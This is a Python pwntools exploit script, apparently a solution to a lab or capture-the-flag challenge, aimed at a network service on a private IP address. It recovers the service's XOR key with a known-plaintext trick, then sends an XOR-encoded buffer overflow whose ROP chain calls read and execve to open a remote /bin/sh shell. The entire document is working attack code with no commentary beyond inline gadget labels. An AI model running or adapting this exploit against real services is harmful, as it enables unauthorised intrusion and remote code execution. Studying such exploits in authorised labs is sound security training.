#!/usr/bin/env python
from pwn import *

def xor_cipher(text, key):
	ciphered_text = ''

	for i in range(len(text)):
		ciphered_text += chr(ord(text[i]) ^ ord(key[i % 128]))

	return ciphered_text

r = remote('192.168.1.111', 20002)

payload  = ''
payload += 'E'
payload += p32(128)
payload += 'A' * 128 # xor key size

r.sendafter(']\n', payload)
r.recv()

ciphered_text = r.recv()[-128:]
xor_key = ''

for i in range(len(ciphered_text)):
	xor_key += chr(ord(ciphered_text[i]) ^ ord('A'))

log.success('XOR key: ' + xor_key.encode('hex'))

rop_chain  = ''
rop_chain += 'A' * 131088
rop_chain += p32(0x8048860) # read
rop_chain += p32(0x8048f85) # pop3ret
rop_chain += p32(0x0) # stdin
rop_chain += p32(0x804b410) # data section
rop_chain += p32(0x100) # len
rop_chain += p32(0x80489b0) # execve
rop_chain += p32(0x8048960) # exit
rop_chain += p32(0x804b410) # /bin/sh\00
rop_chain += p32(0x0) # null
rop_chain += p32(0x0) # null

payload  = ''
payload += 'E'
payload += p32(len(rop_chain))
payload += xor_cipher(rop_chain, xor_key)

r.send(payload)
r.send('Q')
r.send('/bin/sh\00')

r.interactive()